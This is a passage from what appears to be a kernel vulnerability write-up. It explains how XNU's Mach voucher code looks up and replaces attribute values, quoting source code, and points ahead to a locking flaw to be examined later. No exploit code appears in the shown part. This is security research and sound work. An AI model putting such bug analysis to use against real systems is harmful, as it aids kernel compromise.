class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv_global_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;].&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivgte_control&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;IVAC_NULL &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Get the entry and then the linked values.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* TODO: support chained values (for effective vouchers).&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_refs &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; values&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;]&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;count &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;The locking used in the vouchers code is very important for properly understanding the underlying vulnerability when we eventually get there, but for now I&amp;#39;m glossing over it and we&amp;#39;ll return to examine the relevant locks when necessary.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Let&amp;#39;s discuss the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_lookup_values&lt;/span&gt;&lt;span&gt;&amp;nbsp;code. They index the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_global_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;to get a pointer to the attribute type&amp;#39;s controller:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.93bdc79665655f06bb0a73947fc8e84ad29d789b"&gt;&lt;/a&gt;&lt;a id="t.24"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv_global_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;].&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivgte_control&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;They take that controller&amp;#39;s lock then index its &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;to find that value&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;struct ivac_entry_s&lt;/span&gt;&lt;span&gt;&amp;nbsp;and read the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;value from there:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.dd7ea114ff79be6833293594657c2e978bc73a24"&gt;&lt;/a&gt;&lt;a id="t.25"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_refs &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; values&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;]&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;count &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Let&amp;#39;s go back to the calling function (&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_replace_voucher_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;) and keep reading:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a0e6fa2961c22bcc59d9cf5d3ac1f7a80569832f"&gt;&lt;/a&gt;&lt;a id="t.26"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* Call out to resource manager to get new value */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; new_value_voucher &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;IV_NULL&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam_get_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; previous_vals&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;previous_vals_count&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_flag&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;new_value_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_release&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivam-&amp;gt;ivam_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is calling the attribute type&amp;#39;s function pointer which defines the meaning for the particular type of &amp;quot;&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;get_value&lt;/span&gt;&lt;span&gt;&amp;quot;. The term &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;here is a little confusing; aren&amp;#39;t we trying to store a new value? (and there&amp;#39;s no subsequent call to a method like &amp;quot;&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;store_value&lt;/span&gt;&lt;span&gt;&amp;quot;.) A better way to think about the semantics of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is that it&amp;#39;s meant to evaluate both &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;previous_vals&lt;/span&gt;&lt;span&gt;&amp;nbsp;(either the value from &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;previous_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;or the value currently in this voucher) and &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;content&lt;/span&gt;&lt;span&gt;&amp;nbsp;(the arbitrary byte buffer from this sub-recipe) and combine/evaluate them to &lt;/span&gt;&lt;span class="BGLtzooHlW-c14"&gt;create&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;a value representation. It&amp;#39;s then up to the controller layer to store/cache that value. (Actually there&amp;#39;s one tedious snag in this system which we&amp;#39;ll get to involving locking...)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivam_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;for the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;attribute type is &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;user_data_get_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.65736db9786b611699f698b6e62ebfcd88a48199"&gt;&lt;/a&gt;&lt;a id="t.27"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span 